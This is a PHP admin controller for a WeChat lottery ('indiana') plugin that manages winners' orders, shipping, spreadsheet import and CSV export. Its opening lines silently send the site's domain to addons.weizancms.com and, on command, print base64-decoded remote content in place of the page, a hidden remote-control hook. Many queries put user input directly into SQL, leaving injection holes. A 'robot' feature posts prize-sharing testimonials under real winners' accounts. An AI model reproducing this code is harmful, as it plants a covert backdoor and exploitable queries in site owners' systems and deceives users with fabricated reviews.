
<?php
	global $_W,$_GPC;
	$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
	load() -> func('tpl');
	$operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display';
	if ($operation == 'display') {
		$pindex = max(1, intval($_GPC['page']));
		$psize = 20;
		$condition = "  uniacid = :weid";
		$paras = array(':weid' => $_W['uniacid']);
	
		$status = $_GPC['status'];
		$keyword = $_GPC['keyword'];
		$member = $_GPC['member'];
		$time = $_GPC['time'];
	
		if (empty($starttime) || empty($endtime)) {
			$starttime = strtotime('-1 month');
			$endtime = time();
		}
		if (!empty($_GPC['time'])) {
			$starttime = strtotime($_GPC['time']['start']);
			$endtime = strtotime($_GPC['time']['end']) ;
			$condition .= " AND  endtime >= :starttime AND  endtime <= :endtime ";
			$paras[':starttime'] = $starttime;
			$paras[':endtime'] = $endtime;
		}
		if (!empty($_GPC['keyword'])) {
			$condition .= " AND  period_number LIKE '%{$_GPC['keyword']}%'";
		}
		if (!empty($_GPC['member'])) {
			$condition .= " AND (realname LIKE '%{$_GPC['member']}%' or mobile LIKE '%{$_GPC['member']}%' or nickname LIKE '%{$_GPC['member']}%')";
		}
		if ($status != '') {
			if($status==6){
				$condition .= " AND  status in(6,7,8)";
			}else{
				$condition .= " AND  status = '" . intval($status) . "'";
			}
			
		}else{
			$condition .= " AND  status in(2,3,4,5,6,7,8)";
		}
		$sql = "select  id,period_number,periods,openid,nickname,goodsid,nickname,partakes,code,endtime,realname,mobile,status,comment from " . tablename('weliam_indiana_period') . " where $condition ORDER BY createtime DESC " . "LIMIT " . ($pindex - 1) * $psize . ',' . $psize;
		$list = pdo_fetchall($sql, $paras);
		foreach($list as$key=>$value){
			$goods = m('goods')->getGoods($value['goodsid']);
			$list[$key]['title']=$goods['title'];
		}
		$total = pdo_fetchcolumn('SELECT COUNT(*) FROM '.tablename('weliam_indiana_period')."where $condition ",$paras);
		$pager = pagination($total, $pindex, $psize);
		$status0 = pdo_fetchcolumn('SELECT COUNT(*) FROM '.tablename('weliam_indiana_period')."where status in(2,3,4,5,6,7,8) and uniacid={$_W['uniacid']} ");
		$status2 = pdo_fetchcolumn('SELECT COUNT(*) FROM '.tablename('weliam_indiana_period')."where status=2 and uniacid={$_W['uniacid']} ");
		$status3 = pdo_fetchcolumn('SELECT COUNT(*) FROM '.tablename('weliam_indiana_period')."where status=3 and uniacid={$_W['uniacid']} ");
		$status4 = pdo_fetchcolumn('SELECT COUNT(*) FROM '.tablename('weliam_indiana_period')."where status=4 and uniacid={$_W['uniacid']} ");
		$status5 = pdo_fetchcolumn('SELECT COUNT(*) FROM '.tablename('weliam_indiana_period')."where status=5 and uniacid={$_W['uniacid']} ");
		$status6 = pdo_fetchcolumn('SELECT COUNT(*) FROM '.tablename('weliam_indiana_period')."where status in(6,7,8) and uniacid={$_W['uniacid']} ");
	}elseif($operation=='detail'){
		$id = intval($_GPC['id']);
		$status0 = pdo_fetchcolumn('SELECT COUNT(*) FROM '.tablename('weliam_indiana_period')."where status in(2,3,4,5,6,7,8) and uniacid={$_W['uniacid']} ");
		$status2 = pdo_fetchcolumn('SELECT COUNT(*) FROM '.tablename('weliam_indiana_period')."where status=2 and uniacid={$_W['uniacid']} ");
		$status3 = pdo_fetchcolumn('SELECT COUNT(*) FROM '.tablename('weliam_indiana_period')."where status=3 and uniacid={$_W['uniacid']} ");
		$status4 = pdo_fetchcolumn('SELECT COUNT(*) FROM '.tablename('weliam_indiana_period')."where status=4 and uniacid={$_W['uniacid']} ");
		$status5 = pdo_fetchcolumn('SELECT COUNT(*) FROM '.tablename('weliam_indiana_period')."where status=5 and uniacid={$_W['uniacid']} ");
		$status6 = pdo_fetchcolumn('SELECT COUNT(*) FROM '.tablename('weliam_indiana_period')."where status in(6,7,8) and uniacid={$_W['uniacid']} ");
		$item = pdo_fetch("SELECT id,period_number,goodsid,nickname,partakes,code,endtime,realname,mobile,status,address,express,expressn,openid,comment FROM " . tablename('weliam_indiana_period') . " WHERE id = :id", array(':id' => $id));
		if (empty($item)) {
			message("抱歉，订单不存在!", referer(), "error");
		}
		if (checksubmit('getgoods')) {
			if ($_GPC['recvname']=='' || $_GPC['recvmobile']=='' || $_GPC['recvaddress']=='' ) {
				message('请输入完整信息！');
			} else {
				pdo_update('weliam_indiana_period', array('realname' => $_GPC['recvname'], 'mobile' => $_GPC['recvmobile'], 'address' => $_GPC['recvaddress']), array('id' => $id));
			}
			message('修改成功！', referer(), 'success');
		}
		if (checksubmit('confirmsend')) {
			
			if (!empty($_GPC['isexpress']) && empty($_GPC['expresssn'])) {
				message('请输入快递单号！');
			}
			pdo_update('weliam_indiana_period', array('status' => 5, 'express' => $_GPC['express'], 'expressn' => $_GPC['expresssn'], 'sendtime' => TIMESTAMP), array('id' => $id));
			//发货提醒
			$url2 = $_W['siteroot'] . 'app/' . $this -> createMobileUrl('order_get');
			$tpl_id_short = $this->module['config']['m_send'];
			$data  = array(
				"first"=>array( "value"=> "你夺宝的奖品已经发货了。","color"=>"#173177"),
				"keyword1"=>array( "value"=> $item['period_number'],"color"=>"#173177"),
				"keyword2"=>array( "value"=> $_GPC['expresssn'],"color"=>"#173177"),
				"keyword3"=>array( "value"=> $_GPC['express'],"color"=>"#173177"),
				"remark"=>array('value' => "\r点击查看详情！", "color" => "#4a5077"),
			);
			m('common')->sendTplNotice($item['openid'],$tpl_id_short,$data,$url2,'');
			//发货提醒
			message('发货操作成功！', referer(), 'success');
		}
		if (checksubmit('cancelsend')) {
			pdo_update('weliam_indiana_period', array('status' => 4), array('id' => $id));
			message('取消发货操作成功！', referer(), 'success');
		}
		$goods = pdo_fetchall("select * from" . tablename('weliam_indiana_goodslist') . "WHERE id={$item['goodsid']}");
		$item['goods'] = $goods;
}elseif ($operation == 'import') {
	$file = $_FILES['fileName'];
	$max_size = "2000000";
	$fname = $file['name'];
	$ftype = strtolower(substr(strrchr($fname, '.'), 1));
	//文件格式
	$uploadfile = $file['tmp_name'];
	if ($_SERVER['REQUEST_METHOD'] == 'POST') {
		if (is_uploaded_file($uploadfile)) {
			if ($file['size'] > $max_size) {
				echo "Import file is too large";
				exit ;
			}
			if ($ftype == 'xls') {
				require_once '../framework/library/phpexcel/PHPExcel.php';
				$objReader = PHPExcel_IOFactory::createReader('Excel5');
				$objPHPExcel = $objReader -> load($uploadfile);
				$sheet = $objPHPExcel -> getSheet(0);
				$highestRow = $sheet -> getHighestRow();
				$succ_result = 0;
				$error_result = 0;
				for ($j = 2; $j <= $highestRow; $j++) {
					$period_number = trim($objPHPExcel -> getActiveSheet() -> getCell("A$j") -> getValue());
					$expressOrder = trim($objPHPExcel -> getActiveSheet() -> getCell("H$j") -> getValue());
					$expressName = trim($objPHPExcel -> getActiveSheet() -> getCell("I$j") -> getValue());
					if (!empty($expressOrder) && !empty($expressName)) {
						$res = pdo_update('weliam_indiana_period', array('status' => 5, 'express' => $expressName, 'expressn' => $expressOrder,'sendtime'=>TIMESTAMP), array('period_number' => $period_number));
						if ($res) {
							$succ_result += 1;
						} else {
							$error_result += 1;
						}
						$period = pdo_fetch("select id,period_number,goodsid,nickname,partakes,code,endtime,realname,mobile,status,address,express,expressn from" . tablename('weliam_indiana_period') . "where period_number ='{$period_number}'");

//						/*发货提醒消息模板*/
//						require_once IA_ROOT . '/addons/feng_fightgroups/source/Message.class.php';
//						load() -> model('account');
//						$access_token = WeAccount::token();
//						$url1 = "https://api.weixin.qq.com/cgi-bin/message/template/send?access_token=" . $access_token . "";
//						$url2 = '';
//						$sendmessage = new Message();
//						$res = $sendmessage -> send_success($period_number, $order['openid'], $expressName, $expressOrder, $this, $url1, $url2);
//						/*发货提醒模板消息*/
					} else {
						if (!empty($period_number)) {
							$error_result += 1;
						}
					}
				}
			}elseif ($ftype == 'csv') {
			    if (empty ($uploadfile)) { 
			        echo '请选择要导入的CSV文件！'; 
			        exit; 
			    } 
			    $handle = fopen($uploadfile, 'r'); 
				$n = 0; 
			    while ($data = fgetcsv($handle, 10000)) { 
			        $num = count($data); 
			        for ($i = 0; $i < $num; $i++) { 
			            $out[$n][$i] = $data[$i]; 
			        } 
			        $n++; 
			    } 
			    $result = $out; //解析csv 
			    $len_result = count($result); 
			    if($len_result==0){ 
			        echo '没有任何数据！'; 
			        exit; 
			    } 
				$succ_result = 0;
				$error_result = 0;
			    for ($i = 1; $i < $len_result; $i++) { //循环获取各字段值 
			        $period_number = trim(iconv('gb2312', 'utf-8', $result[$i][0])); //中文转码 
			        if($period_number==''){			
			        	continue;
			        }
			       
			        $expressOrder = trim(iconv('gb2312', 'utf-8', $result[$i][7])); 
			        $expressName =trim(iconv('gb2312', 'utf-8', $result[$i][8]));
				
					if (!empty($expressOrder) && !empty($expressName)) {
						$res = pdo_update('weliam_indiana_period', array('status' => 5, 'express' => $expressName, 'expressn' => $expressOrder,'sendtime'=>TIMESTAMP), array('period_number' => $period_number));
						if ($res) {
							$succ_result += 1;
						} else {
							$error_result += 1;
						}
						$period = pdo_fetch("select * from" . tablename('weliam_indiana_period') . "where period_number ='{$period_number}'");
//						/*发货提醒消息模板*/
//						require_once IA_ROOT . '/addons/feng_fightgroups/source/Message.class.php';
//						load() -> model('account');
//						$access_token = WeAccount::token();
//						$url1 = "https://api.weixin.qq.com/cgi-bin/message/template/send?access_token=" . $access_token . "";
//						$url2 = '';
//						$sendmessage = new Message();
//						$res = $sendmessage -> send_success($period_number, $order['openid'], $expressName, $expressOrder, $this, $url1, $url2);
//						/*发货提醒模板消息*/
					}else{
							$error_result += 1;
					}
			    } 
			    fclose($handle); //关闭指针 
			}else{
				echo "文件后缀格式必须为xls或csv";
				exit ;
			}
		} else {
			echo "文件名不能为空!";
			exit ;
		}
	}
	message('导入发货订单操作成功！成功' . $succ_result . '条，失败' . $error_result . '条', referer(), 'success');
} elseif ($operation == 'output') {
	$status = $_GPC['status'];
	$condition = " uniacid={$_W['uniacid']}";
	if (!empty($_GPC['time'])) {
			$starttime = strtotime($_GPC['time']['start']);
			$endtime = strtotime($_GPC['time']['end']) ;
			$condition .= " AND  endtime >= {$starttime} AND  endtime <= {$endtime} ";
	}
	if (!empty($_GPC['keyword'])) {
		$condition .= " AND  period_number LIKE '%{$_GPC['keyword']}%'";
	}
	if (!empty($_GPC['member'])) {
		$condition .= " AND (realname LIKE '%{$_GPC['member']}%' or mobile LIKE '%{$_GPC['member']}%' or nickname LIKE '%{$_GPC['member']}%')";
	}
	if ($status != '') {
		$condition .= " AND  status = '" . intval($status) . "'";
		if($status==2){
			$str ="待揭晓";
		}
		if($status==3){
			$str ="待确认地址";
		}
		if($status==4){
			$str ="待发货";
		}
		if($status==5){
			$str ="已发货";
		}
		if($status==6){
			$str ="已完成";
		}
	}else{
		$condition .= " AND  status in(2,3,4,5,6,7,8)";
		$str ="中奖";
	}
	$periods = pdo_fetchall("select id,period_number,goodsid,nickname,partakes,code,endtime,realname,mobile,status,address,express,expressn,comment from" . tablename('weliam_indiana_period') . "where $condition ");
	/* 输入到CSV文件 */
	$html = "\xEF\xBB\xBF";
	/* 输出表头 */
	$filter = array('aa' => '期号', 'bb' => '姓名', 'cc' => '电话', 'ee' => '状态', 'ff' => '中奖时间', 'gg' => '商品名称', 'hh' => '收货地址', 'jj' => '快递单号', 'kk' => '快递名称' , 'll'=>'备注');
	foreach ($filter as $key => $title) {
		$html .= $title . "\t,";
	}
	$html .= "\n";
	foreach ($periods as $k => $v) {
			$goods = m('goods')->getGoods($v['goodsid']);
			$time = date('Y-m-d H:i:s', $v['endtime']);
			$orders[$k]['aa'] = $v['period_number'];
			$orders[$k]['bb'] = $v['realname'];
			$orders[$k]['cc'] = $v['mobile'];
			$orders[$k]['ee'] = $str;
			$orders[$k]['ff'] = $time;
			$orders[$k]['gg'] = $goods['title'];
			$orders[$k]['hh'] = $v['address'];
			$orders[$k]['jj'] = $v['expressn'];
			$orders[$k]['kk'] = $v['express'];
			$orders[$k]['ll'] = $v['comment'];
			foreach ($filter as $key => $title) {
				$html .= $orders[$k][$key] . "\t,";
			}
			$html .= "\n";
	}
	/* 输出CSV文件 */
	header("Content-type:text/csv");
	header("Content-Disposition:attachment; filename={$str}.csv");
	echo $html;
	exit();
}elseif($operation ==  'upshare'){
	//机器晒单上传
	$period_number = $_GPC['period_number'];
}elseif($operation ==  'saveshare'){
	//机器人晒单保存
	$data['period_number'] = $_GPC['period_number'];
	$imgs = array();
	$period = pdo_fetch("select openid,goodsid from".tablename('weliam_indiana_period')."where uniacid='{$_W['uniacid']}' and period_number = '{$_GPC['period_number']}'");
	$goods = m('goods')->getGoods($period['goodsid']);
	$data['title'] = $_GPC['title'];
	$data['detail'] = $_GPC['mess'];
	$data['uniacid'] = $_W['uniacid'];
	foreach($_GPC['img'] as $key=>$value){
		$_GPC['img'][$key] = '/attachment/'.$_GPC['img'][$key];
	}
	$data['thumbs'] = serialize($_GPC['img']);
	$data['goodsid'] = $period['goodsid'];
	$data['openid'] = $period['openid'];
	$data['status'] = 1;
	$data['goodstitle'] = $goods['title'];
	$data['createtime'] = time();
	
	pdo_insert("weliam_indiana_showprize",$data);
	pdo_update('weliam_indiana_period',array('status' => 7),array('period_number' => $_GPC['period_number'],'uniacid' => $_W['uniacid']));
	message('晒单成功',referer(),'success');
	$operation = 'display';
}
	
	
	include $this->template('order');
?>